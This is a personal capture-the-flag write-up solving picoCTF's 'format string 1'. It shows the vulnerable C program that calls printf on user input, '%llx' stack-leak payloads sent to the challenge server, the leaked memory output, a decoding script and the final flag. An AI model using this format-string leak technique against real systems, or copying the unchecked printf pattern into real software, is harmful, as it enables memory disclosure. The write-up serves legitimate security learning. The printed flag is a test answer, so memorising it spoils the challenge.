# format string 1

## Method

```
Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 58368

```
**Hint1:** https://lettieri.iet.unipi.it/hacking/format-strings.pdf <br>
**Hint2:** Is this a 32-bit or 64-bit binary?


```c
  #include <stdio.h>


  int main() {
    char buf[1024];
    char secret1[64];
    char flag[64];
    char secret2[64];

    // Read in first secret menu item
    FILE *fd = fopen("secret-menu-item-1.txt", "r");
    if (fd == NULL){
      printf("'secret-menu-item-1.txt' file not found, aborting.\n");
      return 1;
    }
    fgets(secret1, 64, fd);
    // Read in the flag
    fd = fopen("flag.txt", "r");
    if (fd == NULL){
      printf("'flag.txt' file not found, aborting.\n");
      return 1;
    }
    fgets(flag, 64, fd);
    // Read in second secret menu item
    fd = fopen("secret-menu-item-2.txt", "r");
    if (fd == NULL){
      printf("'secret-menu-item-2.txt' file not found, aborting.\n");
      return 1;
    }
    fgets(secret2, 64, fd);

    printf("Give me your order and I'll read it back to you:\n");
    fflush(stdout);
    scanf("%1024s", buf);
    printf("Here's your order: ");
    printf(buf);
    printf("\n");
    fflush(stdout);

    printf("Bye!\n");
    fflush(stdout);

    return 0;
  }
```

This c programme seems alot less complicated than the format_string_0 thankfully so lets analyse first.

At the start of the programme we have our general declarations with ``buff`` containing atleast 1024 characters to form a string and ``secret1``, ``flag``, ``secret2`` being 64 characters.

First it seems to read the content of ``secret-menu-item-1.txt`` into secret1. next the content of ``flag.txt`` into flag and lastly the content of ``secret-menu-item-2.txt`` into secret2. 

Once this is all done we seem to get a user prompt and input that takes a ``scanf("%1024s", buf)`` to which it then prints out our order then exits the programme. This is then printed out without a format specifier ``printf(buf);`` which we most likely have to abuse and exploit to our advantage.

Essentially when entering our exploit we need to exploit the ``fgets(flag, 64, fd); fd = fopen("secret-menu-item-2.txt", "r");``
I can assume that we are supposed to read the flag variable from this ``char flag[64];`` to get the flag. Now last time we understood that using %s multiple times prints stuff on the stack. However it seems this time i may need to calculate where i want to print it from 

Now lets first see what kind of binary file they have provided as i did not check last time. 
upon using ``file filename`` command on the binary we know its 64 bits as shown with the hint meaning if we the memory addresses are 64 bits wide as well hence when pieces of data pushed onto the stack such as a local variable or argument will typically be 64 bits (8 bytes) on a 64-bit system. Meaning we can traverse the stack by forcing it to print values on it for 8 bytes each allowing us to view the variables.

Hence as they have given us a test binary we can possibly replicate a test input / output. As we know the secret1 and the secret2 are around the flag so what if we set these to known values such as 1, 2?. 

For eg we can set both secret1 and secret2 to just be 1 and 2 of 64 bytes also filling up the storage of secret1 and secret 2 variables when opened. Hence we can then set a dummy flag.

```shell
hadakoi@Laptop:~/ctfsolve$ cat secret-menu-item-1.txt
1111111111111111111111111111111111111111111111111111111111111111
hadakoi@Laptop:~/ctfsolve$ cat secret-menu-item-2.txt
2222222222222222222222222222222222222222222222222222222222222222
hadakoi@Laptop:~/ctfsolve$ cat flag.txt
picoCTF{test}
hadakoi@Laptop:~/ctfsolve$
```
ofcourse now trying to execute the binary with what they gave passing our possible payload which ``%llx, `` This prints 8 bytes of the stack in hex. 

```shell
hadakoi@Laptop:~/ctfsolve$ cat payload.py
print('%llx,' * 50)
hadakoi@Laptop:~/ctfsolve$
```

```shell
hadakoi@Laptop:~/ctfsolve$ python3 payload.py | ./format-string-1
Give me your order and I'll read it back to you:
Here's your order: 7ffdf5bb6120,0,0,a,400,3232323232323232,3232323232323232,3232323232323232,3232323232323232,3232323232323232,3232323232323232,3232323232323232,32323232323232,7b4654436f636970,a7d74736574,7ffdf5bb6350,7f1200000000,7f12ebc16ab0,7ffdf5bb6348,7ffdf5bb6440,ffffffff,3131313131313131,3131313131313131,3131313131313131,3131313131313131,3131313131313131,3131313131313131,3131313131313131,31313131313131,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,
Bye!
hadakoi@Laptop:~/ctfsolve$
```

Now over here we see our ``3232323232323232`` which is the hex converted to string for ``22222222``, 8 times we also see ``3131313131313131`` which is the same thing but for one now converting the hex strings inbetween them we see partial parts of our flag

``7b4654436f636970,a7d74736574,7ffdf5bb6350,7f1200000000,7f12ebc16ab0,7ffdf5bb6348,7ffdf5bb6440,ffffffff`` -> ``{FTCocipÂ§Ã—G6WGÃ¿ÃŸ[Â¶5Ã± Ã±.Â¼Â«Ã¿ÃŸ[Â¶4Â‡Ã¿ÃŸ[Â¶DÃ¿Ã¿Ã¿``

We alsocome to realise that the first part of our flag was infact in little endian format meaning if we try this on the server it will also output it back in little endian format. We also see that it starts from the %llx of 14. Hence we print the hex bytes for these specific payloads using ``%13$llx,%14$llx,%15$llx,%16$llx,%17$llx,%18$llx,%19$llx,%20$llx,%21$llx``.

Hence now we test this input printing the locations specifically at the 13th val of the array and so on.  

```shell

hadakoi@Laptop:~/ctfsolve$ nc mimas.picoctf.net 50137
Give me your order and I'll read it back to you:
%13$llx,%14$llx,%15$llx,%16$llx,%17$llx,%18$llx,%19$llx,%20$llx,%21$llx
Here's your order: 0,7b4654436f636970,355f31346d316e34,3478345f33317937,35365f673431665f,7d313464303935,7,7400056c38d8,2300000007
Bye!
```

now upon looking at this and putting it into a hex converter we get a bunch of gibberish however trying each of the first few bytes seperately such as ``7b4654436f636970,355f31346d316e34,3478345f33317937,35365f673431665f,7d313464303935`` returns us ``{FTCocip5_14m1n44x4_31y756_g41f_}14d095`` now as we know this was in little endian format we just need to slice the string by 8 chars and reverse it this lets us get the flag as ``picoCTF{4n1m41_57y13_4x4_f14g_65590d41}`` Hence solved.

My script for converting 

```
hex_values = [
    "7b4654436f636970",
    "355f31346d316e34",
    "3478345f33317937",
    "35365f673431665f",
    "7d313464303935"
]

# Convert each hex value to ASCII, reverse it, and concatenate the results
decoded_string = ''.join(bytes.fromhex(hex_value).decode('utf-8')[::-1] for hex_value in hex_values)

print(decoded_string)
```

## Flag

> picoCTF{4n1m41_57y13_4x4_f14g_65590d41}